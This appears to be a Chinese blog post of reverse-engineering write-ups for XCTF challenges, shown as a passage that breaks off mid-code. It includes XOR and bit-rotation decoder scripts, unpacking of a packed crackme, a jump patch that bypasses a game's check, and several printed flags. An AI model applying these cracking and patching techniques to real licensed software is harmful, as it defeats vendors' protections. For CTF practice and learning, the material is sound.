<p>还有wp里的python写法，取模256</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">key= [<span class="number">26</span>, <span class="number">162</span>, <span class="number">47</span>, <span class="number">249</span>, <span class="number">148</span>, <span class="number">67</span>, <span class="number">60</span>, <span class="number">196</span>, <span class="number">77</span>, <span class="number">216</span>, <span class="number">140</span>, <span class="number">197</span>, <span class="number">91</span>, <span class="number">182</span>, <span class="number">110</span>, <span class="number">234</span>, <span class="number">163</span>, <span class="number">60</span>, <span class="number">201</span>, <span class="number">155</span>, <span class="number">188</span>, <span class="number">202</span>, <span class="number">173</span>, <span class="number">215</span>, <span class="number">126</span>, <span class="number">224</span>]</span><br><span class="line">c_txt = [<span class="number">0x0F</span>, <span class="number">0x87</span>, <span class="number">0x62</span>, <span class="number">0x14</span>, <span class="number">0x01</span>, <span class="number">0xC6</span>, <span class="number">0xF0</span>, <span class="number">0x21</span>, <span class="number">0x30</span>, <span class="number">0x11</span>, <span class="number">0x50</span>, <span class="number">0xD0</span>, <span class="number">0x82</span>, <span class="number">0x23</span>, <span class="number">0xAE</span>, <span class="number">0x23</span>, <span class="number">0xEE</span>, <span class="number">0xA9</span>, <span class="number">0xB4</span>, <span class="number">0x52</span>, <span class="number">0x78</span>, <span class="number">0x57</span>, <span class="number">0x0C</span>, <span class="number">0x86</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">s=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">25</span>):</span><br><span class="line">    x = key[i] ^ c_txt[i] </span><br><span class="line">    y = ((x&lt;&lt;(<span class="number">8</span> - <span class="number">2</span>))|(x&gt;&gt;<span class="number">2</span>))%<span class="number">256</span> </span><br><span class="line">    <span class="keyword">print</span> x, y </span><br><span class="line">    s+=chr(y) </span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure>
<blockquote>
<p>总结一下，还是查找字符串，看程序的功能交互</p>
<p>不要迷失在库函数之中</p>
<p>还有就是<strong>循环左移</strong>的解密</p>
</blockquote>
<h2 id="reverse-box"><a href="#reverse-box" class="headerlink" title="reverse_box"></a>reverse_box</h2><blockquote>
<p>./reverse_box ${FLAG}</p>
<p>95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a</p>
</blockquote>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/26.png" alt="26"></p>
<p>题目逻辑：<code>fill_buffer</code>函数中，随机取一个1-255之间的数值，根据这个数值生成一个256字节的数组</p>
<p>这个数组的可能性只有255种，然后就是爆破所有情况，看TWCTF在不在里面，据说和SBox有关</p>
<p>看了好几份wp，总之是人为设置这个种子，遍历所有情况，得到所有可能的数组</p>
<p>但是我学不来……….然后看TWCTF在不在输出值中</p>
<p>放弃了……..</p>
<h2 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h2><p>exe逆向，先IDA打开发现没有main，显然是加壳了….PEID等工具查一下发现是<code>nSPack</code>壳，PEID自带的脱壳器还不起作用，后来看雪上找了个工具(<del>还自带BGM…</del>)</p>
<p>然后分析就很简单了，异或数组</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> xor_arr[<span class="number">16</span>] = &#123;</span><br><span class="line">	<span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">105</span>,</span><br><span class="line">	<span class="number">115</span>, <span class="number">95</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">116</span>,	<span class="number">95</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> enc[] = &#123;</span><br><span class="line">	<span class="number">18</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">20</span>, <span class="number">36</span>, <span class="number">92</span>, <span class="number">74</span>, <span class="number">61</span>, <span class="number">86</span>, <span class="number">10</span>, <span class="number">16</span>, <span class="number">103</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">	<span class="number">0</span>, <span class="number">1</span>, <span class="number">70</span>, <span class="number">90</span>, <span class="number">68</span>, <span class="number">66</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">114</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">64</span>,</span><br><span class="line">	<span class="number">62</span>, <span class="number">75</span>, <span class="number">95</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">76</span>, <span class="number">94</span>, <span class="number">91</span>, <span class="number">23</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">22</span>, <span class="number">104</span>,</span><br><span class="line">	<span class="number">91</span>, <span class="number">18</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>**argv)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%c"</span>, enc[i] ^ xor_arr[i % <span class="number">16</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="handcrafted-pyc"><a href="#handcrafted-pyc" class="headerlink" title="handcrafted-pyc"></a>handcrafted-pyc</h2><p><a href="https://0x90r00t.com/2016/10/10/hitcon-2016-reverse-50-handcrafted-pyc-write-up/" target="_blank" rel="noopener">wp</a></p>
<p>暂时还不想学pyc逆向，先放着吧</p>
<h2 id="RE100"><a href="#RE100" class="headerlink" title="RE100"></a>RE100</h2><p>程序中一开始有很多pipe、fork等操作…不是很懂，不过和解题没什么关系</p>
<p>输入的字符串分块后，交换位置就是flag</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/27.png" alt="27"></p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/28.png" alt="28"></p>
<p>每10个字符为一块，原本的1234共四个字符串的排列转变成为3412的排列顺序，变化排列顺序后</p>
<p>与<code>{daf29f59034938ae4efd53fc275d81053ed5be8c}</code>进行比较</p>
<h2 id="re3-100待做"><a href="#re3-100待做" class="headerlink" title="re3-100待做"></a>re3-100待做</h2><blockquote>
<p>千万不要运行这个程序，如果想体验死机的话当我没说</p>
</blockquote>
<p>这个**程序，一般IDA看的复杂都交互一下吧…结果一个输入，开始满屏弹窗cmd，还在目录里面创建了几万个文件夹我艹，虚拟机卡死任务管理器都开不出来</p>
<p>最后继续运行虚拟机，让它继续弹窗，几秒钟后内存占用17G，最后在活动监视器里杀掉进程，向运维投诉…</p>
<blockquote>
<p>不过看了wp以后发现，这题是一个pyc的exe，存了wp再说</p>
</blockquote>
<h2 id="gametime"><a href="#gametime" class="headerlink" title="gametime"></a>gametime</h2><p>题目比较简单，基本就是看到需要的字符时就按下回车</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/29.png" alt="29"></p>
<p>失败的话会输出FAILURE</p>
<p>IDA打开，搜索字符串，分析后发现只要把跳转指令改一下，这样就不用按空格了</p>
<p>只要让游戏自己玩就可以最后得出key了</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/30.png" alt="30"></p>
<p>有两处有FAILURE，这是其中一处，patch成jz就可以了</p>
<h2 id="notsequence"><a href="#notsequence" class="headerlink" title="notsequence"></a>notsequence</h2><p>杨辉三角，没什么意思，<a href="https://blog.iret.xyz/article.aspx/rctf2015_reverse" target="_blank" rel="noopener">wp</a></p>
<p>exp(感觉uns3t师傅…)</p>
<blockquote>
<p>xctf的wp没有排版，真难受……</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">yanghui_trangle</span><span class="params">(n)</span>:</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_yanghui_trangle</span><span class="params">(n, result)</span>:</span> </span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">1</span>: </span><br><span class="line">            <span class="keyword">return</span> [<span class="number">1</span>] </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">return</span> [sum(i) <span class="keyword">for</span> i <span class="keyword">in</span> zip([<span class="number">0</span>] + result, result + [<span class="number">0</span>])] </span><br><span class="line"></span><br><span class="line">    pre_result = [] </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(n): </span><br><span class="line">        pre_result = _yanghui_trangle(i + <span class="number">1</span>, pre_result) </span><br><span class="line">    <span class="keyword">yield</span> pre_result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">all_lines = <span class="string">""</span> </span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> yanghui_trangle(<span class="number">20</span>): </span><br><span class="line">    all_lines += <span class="string">""</span>.join([str(c) <span class="keyword">for</span> c <span class="keyword">in</span> line]) </span><br><span class="line">    <span class="keyword">print</span> all_lines </span><br><span class="line">t_md5 = hashlib.md5() </span><br><span class="line">t_md5.update(all_lines) </span><br><span class="line"><span class="keyword">print</span> <span class="string">"RCTF&#123;%s&#125;"</span>%t_md5.hexdigest()</span><br></pre></td></tr></table></figure>
<p>不过官方exp出的flag也不对…….</p>
<h2 id="CRACKME"><a href="#CRACKME" class="headerlink" title="CRACKME"></a>CRACKME</h2><p><a href="https://blog.csdn.net/whklhhhh/article/details/78005589" target="_blank" rel="noopener">夜影wp</a></p>
<p>无壳，没有main函数，看上去是MFC写的(别人说的)</p>
<p>字符串窗口中也没有相关显示</p>
<p>看<code>MessageBox</code>的交叉引用，发现有两个函数调用了它</p>
<p>看汇编时发现这两个函数的call都是来源于同一个函数，并且还是分支关系</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/34.png" alt="34"></p>
<p>在IDA中按P，再F5</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/35.png" alt="35"></p>
<blockquote>
<p>回到汇编状态找到sub_401720和sub_4016e0的地址，在OD中下断，再点击注册按钮果然被401720断下来了，说明这里就是关键跳</p>
</blockquote>
<p>if的判断中是关键的flag_check</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/36.png" alt="36"></p>
<p>初始以10作为种子，rand[0]为0x47（71）；以1作为种子，rand[0]为0x29（41）<br>也就是说seed代入数组运算时恒为1</p>
<blockquote>
<p>MFC的updateData可以理解为读入字符串</p>
</blockquote>
<p>因为这里是指针调用函数，if的条件又太乱了，直接看汇编</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/37.png" alt="37"></p>
<p>看出要求输出的字符串长度为0x21，然后进行检查（再回去看看F5的结果也能得到）</p>
<p>这种直接把输入进去比较，当然是直接动态调了</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/38.png" alt="38"></p>
<p>可以直接断几十次记录下应有的输入，第一个是0x68也就是f</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/39.png" alt="39"></p>
<p>不过这里既然已经分析出逻辑了</p>
<p><code>v3[v5 + 96 + seed]  // (v3+97)[10x]</code></p>
<p>找到这个字符串，IDA里提取一下</p>
<p>输出第(10n+1)个字符就可以了</p>
<p><code>flag{The-Y3ll0w-turb4ns-Upri$ing}</code></p>
<p>有一点问题就是……没看出来为什么a2就是我们的输入</p>
<blockquote>
<p>最后的一些思考：</p>
<p>又学习到了srand、rand的一个特性，通过初始种子，随机出的第一个数经过一定运算再作为种子，输出随机数，以此往复，最后输出的值可以是固定的</p>
<p>还有就是一长串字符串，跳着比较输出，可以一定的混淆</p>
<p>MFC程序的一些特征，API等</p>
</blockquote>
<h2 id="Shuffle"><a href="#Shuffle" class="headerlink" title="Shuffle"></a>Shuffle</h2><blockquote>
<p>题目描述：找到字符串在随机化之前</p>
</blockquote>
<p>好的，结果一找就找到了，送分题</p>
<h1 id="高手进阶"><a href="#高手进阶" class="headerlink" title="高手进阶"></a>高手进阶</h1><h2 id="Newbie-calculations"><a href="#Newbie-calculations" class="headerlink" title="Newbie_calculations"></a>Newbie_calculations</h2><p>程序会自己跑出flag，主要是代码中用了故意耗时的计算函数</p>
<p>都是加减乘，分析一下不难看出，网上找了一个改好函数名的代码</p>
<p>每一位字符都是独立的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// all flag chars are set to 1</span></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">  flag_chars[i] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">flag_chars[<span class="number">32</span>] = <span class="number">0</span>; <span class="comment">// null terminator</span></span><br><span class="line"></span><br><span class="line">print_text(<span class="string">"Your flag is:"</span>);</span><br><span class="line"></span><br><span class="line">var0 = mul_ab(flag_chars, <span class="number">1000000000</span>);</span><br><span class="line">var1 = sub_ab(var0, <span class="number">999999950</span>);</span><br><span class="line">mul_ab(var1, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// 100 = d</span></span><br><span class="line"></span><br><span class="line">var2 = add_ab(&amp;flag_chars[<span class="number">1</span>], <span class="number">5000000</span>);           </span><br><span class="line">var3 = sub_ab(var2, <span class="number">6666666</span>);             </span><br><span class="line">var4 = add_ab(var3, <span class="number">1666666</span>);</span><br><span class="line">var5 = add_ab(var4, <span class="number">45</span>);</span><br><span class="line">var6 = mul_ab(var5, <span class="number">2</span>);</span><br><span class="line">add_ab(var6, <span class="number">5</span>);</span><br><span class="line"><span class="comment">// 97 = a</span></span><br><span class="line"></span><br><span class="line">var7 = mul_ab(&amp;flag_chars[<span class="number">2</span>], <span class="number">1000000000</span>);</span><br><span class="line">var8 = sub_ab(var7, <span class="number">999999950</span>);</span><br><span class="line">var9 = mul_ab(var8, <span class="number">2</span>);</span><br><span class="line">add_ab(var9, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// 102 = f</span></span><br><span class="line"></span><br><span class="line">var10 = add_ab(&amp;flag_chars[<span class="number">3</span>], <span class="number">55</span>);</span><br><span class="line">var11 = sub_ab(var10, <span class="number">3</span>);</span><br><span class="line">var12 = add_ab(var11, <span class="number">4</span>);</span><br><span class="line">sub_ab(var12, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// 56 = 8</span></span><br><span class="line"></span><br><span class="line">var13 = mul_ab(&amp;flag_chars[<span class="number">4</span>], <span class="number">100000000</span>);</span><br><span class="line">var14 = sub_ab(var13, <span class="number">99999950</span>);</span><br><span class="line">var15 = mul_ab(var14, <span class="number">2</span>);</span><br><span class="line">add_ab(var15, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// 102 = f</span></span><br><span class="line"></span><br><span class="line">var16 = sub_ab(&amp;flag_chars[<span class="number">5</span>], <span class="number">1</span>);</span><br><span class="line">var17 = mul_ab(var16, <span class="number">1000000000</span>);</span><br><span class="line">var18 = add_ab(var17, <span class="number">55</span>);</span><br><span class="line">sub_ab(var18, <span class="number">3</span>);</span><br><span class="line"><span class="comment">// 52 = 4</span></span><br><span class="line"></span><br><span class="line">var19 = mul_ab(&amp;flag_chars[<span class="number">6</span>], <span class="number">1000000</span>);</span><br><span class="line">var20 = sub_ab(var19, <span class="number">999975</span>);</span><br><span class="line">mul_ab(var20, <span class="number">4</span>);</span><br><span class="line"><span class="comment">// 100 = d</span></span><br><span class="line"></span><br><span class="line">var21 = add_ab(&amp;flag_chars[<span class="number">7</span>], <span class="number">55</span>);</span><br><span class="line">var22 = sub_ab(var21, <span class="number">33</span>);</span><br><span class="line">var23 = add_ab(var22, <span class="number">44</span>);</span><br><span class="line">sub_ab(var23, <span class="number">11</span>);</span><br><span class="line"><span class="comment">// 56 = 8</span></span><br><span class="line"></span><br><span class="line">var24 = mul_ab(&amp;flag_chars[<span class="number">8</span>], <span class="number">10</span>);</span><br><span class="line">var25 = sub_ab(var24, <span class="number">5</span>);</span><br><span class="line">var26 = mul_ab(var25, <span class="number">8</span>);</span><br><span class="line">add_ab(var26, <span class="number">9</span>);</span><br><span class="line"><span class="comment">// 49 = 1</span></span><br><span class="line"></span><br><span class="line">var27 = add_ab(&amp;flag_chars[<span class="number">9</span>], <span class="number">0</span>);</span><br><span class="line">var28 = sub_ab(var27, <span class="number">0</span>);</span><br><span class="line">var29 = add_ab(var28, <span class="number">11</span>);</span><br><span class="line">var30 = sub_ab(var29, <span class="number">11</span>);</span><br><span class="line">add_ab(var30, <span class="number">53</span>);</span><br><span class="line"><span class="comment">// 54 = 6</span></span><br><span class="line"></span><br><span class="line">var31 = add_ab(&amp;flag_chars[<span class="number">10</span>], <span class="number">49</span>);</span><br><span class="line">var32 = sub_ab(var31, <span class="number">2</span>);</span><br><span class="line">var33 = add_ab(var32, <span class="number">4</span>);</span><br><span class="line">sub_ab(var33, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// 50 = 2</span></span><br><span class="line"></span><br><span class="line">var34 = mul_ab(&amp;flag_chars[<span class="number">11</span>], <span class="number">1000000</span>);</span><br><span class="line">var35 = sub_ab(var34, <span class="number">999999</span>);</span><br><span class="line">var36 = mul_ab(var35, <span class="number">4</span>);</span><br><span class="line">add_ab(var36, <span class="number">50</span>);</span><br><span class="line"><span class="comment">// 54 = 6</span></span><br><span class="line"></span><br><span class="line">var37 = add_ab(&amp;flag_chars[<span class="number">12</span>], <span class="number">1</span>);</span><br><span class="line">var38 = add_ab(var37, <span class="number">1</span>);</span><br><span class="line">var39 = add_ab(var38, <span class="number">1</span>);</span><br><span class="line">var40 = add_ab(var39, <span class="number">1</span>);</span><br><span class="line">var41 = add_ab(var40, <span class="number">1</span>);</span><br><span class="line">var42 = add_ab(var41, <span class="number">1</span>);</span><br><span class="line">var43 = add_ab(var42, <span class="number">10</span>);</span><br><span class="line">add_ab(var43, <span class="number">32</span>);</span><br><span class="line"><span class="comment">// 49 = 1</span></span><br><span class="line"></span><br><span class="line">var44 = mul_ab(&amp;flag_chars[<span class="number">13</span>], <span class="number">10</span>);</span><br><span class="line">var45 = sub_ab(var44, <span class="number">5</span>);</span><br><span class="line">var46 = mul_ab(var45, <span class="number">8</span>);</span><br><span class="line">var47 = add_ab(var46, <span class="number">9</span>);</span><br><span class="line">add_ab(var47, <span class="number">48</span>);</span><br><span class="line"><span class="comment">// 97 = a</span></span><br><span class="line"></span><br><span class="line">var48 = sub_ab(&amp;flag_chars[<span class="number">14</span>], <span class="number">1</span>);</span><br><span class="line">var49 = mul_ab(var48, <span class="number">4000000000</span>);</span><br><span class="line">var50 = add_ab(var49, <span class="number">55</span>);</span><br><span class="line">sub_ab(var50, <span class="number">3</span>);</span><br><span class="line"><span class="comment">// 52 = 4</span></span><br><span class="line"></span><br><span class="line">var51 = add_ab(&amp;flag_chars[<span class="number">15</span>], <span class="number">1</span>);</span><br><span class="line">var52 = add_ab(var51, <span class="number">2</span>);</span><br><span class="line">var53 = add_ab(var52, <span class="number">3</span>);</span><br><span class="line">var54 = add_ab(var53, <span class="number">4</span>);</span><br><span class="line">var55 = add_ab(var54, <span class="number">5</span>);</span><br><span class="line">var56 = add_ab(var55, <span class="number">6</span>);</span><br><span class="line">var57 = add_ab(var56, <span class="number">7</span>);</span><br><span class="line">add_ab(var57, <span class="number">20</span>);</span><br><span class="line"><span class="comment">// 49 = 1</span></span><br><span class="line"></span><br><span class="line">var58 = mul_ab(&amp;flag_chars[<span class="number">16</span>], <span class="number">10</span>);</span><br><span class="line">var59 = sub_ab(var58, <span class="number">5</span>);</span><br><span class="line">var60 = mul_ab(var59, <span class="number">8</span>);</span><br><span class="line">var61 = add_ab(var60, <span class="number">9</span>);</span><br><span class="line">add_ab(var61, <span class="number">48</span>);</span><br><span class="line"><span class="comment">// 97 = a</span></span><br><span class="line"></span><br><span class="line">var62 = add_ab(&amp;flag_chars[<span class="number">17</span>], <span class="number">7</span>);</span><br><span class="line">var63 = add_ab(var62, <span class="number">6</span>);</span><br><span class="line">var64 = add_ab(var63, <span class="number">5</span>);</span><br><span class="line">var65 = add_ab(var64, <span class="number">4</span>);</span><br><span class="line">var66 = add_ab(var65, <span class="number">3</span>);</span><br><span class="line">var67 = add_ab(var66, <span class="number">2</span>);</span><br><span class="line">var68 = add_ab(var67, <span class="number">1</span>);</span><br><span class="line">add_ab(var68, <span class="number">20</span>);</span><br><span class="line"><span class="comment">// 49 = 1</span></span><br><span class="line"></span><br><span class="line">var69 = add_ab(&amp;flag_chars[<span class="number">18</span>], <span class="number">7</span>);</span><br><span class="line">var70 = add_ab(var69, <span class="number">2</span>);</span><br><span class="line">var71 = add_ab(var70, <span class="number">4</span>);</span><br><span class="line">var72 = add_ab(var71, <span class="number">3</span>);</span><br><span class="line">var73 = add_ab(var72, <span class="number">6</span>);</span><br><span class="line">var74 = add_ab(var73, <span class="number">5</span>);</span><br><span class="line">var75 = add_ab(var74, <span class="number">1</span>);</span><br><span class="line">add_ab(var75, <span class="number">20</span>);</span><br><span class="line"><span class="comment">// 49 = 1</span></span><br><span class="line"></span><br><span class="line">var76 = mul_ab(&amp;flag_chars[<span class="number">19</span>], <span class="number">1000000</span>);</span><br><span class="line">var77 = sub_ab(var76, <span class="number">999999</span>);</span><br><span class="line">var78 = mul_ab(var77, <span class="number">4</span>);</span><br><span class="line">var79 = add_ab(var78, <span class="number">50</span>);</span><br><span class="line">sub_ab(var79, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// 53 = 5</span></span><br><span class="line"></span><br><span class="line">var80 = sub_ab(&amp;flag_chars[<span class="number">20</span>], <span class="number">1</span>);</span><br><span class="line">var81 = mul_ab(var80, <span class="number">-294967296</span>);</span><br><span class="line">var82 = add_ab(var81, <span class="number">49</span>);</span><br><span class="line">sub_ab(var82, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// 48 = 0</span></span><br><span class="line"></span><br><span class="line">var83 = sub_ab(&amp;flag_chars[<span class="number">21</span>], <span class="number">1</span>);</span><br><span class="line">var84 = mul_ab(var83, <span class="number">1000000000</span>);</span><br><span class="line">var85 = add_ab(var84, <span class="number">54</span>);</span><br><span class="line">var86 = sub_ab(var85, <span class="number">1</span>);</span><br><span class="line">var87 = add_ab(var86, <span class="number">1000000000</span>);</span><br><span class="line">sub_ab(var87, <span class="number">1000000000</span>);</span><br><span class="line"><span class="comment">// 53 = 5</span></span><br><span class="line"></span><br><span class="line">var88 = add_ab(&amp;flag_chars[<span class="number">22</span>], <span class="number">49</span>);</span><br><span class="line">var89 = sub_ab(var88, <span class="number">1</span>);</span><br><span class="line">var90 = add_ab(var89, <span class="number">2</span>);</span><br><span class="line">sub_ab(var90, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// 50 = 2</span></span><br><span class="line"></span><br><span class="line">var91 = mul_ab(&amp;flag_chars[<span 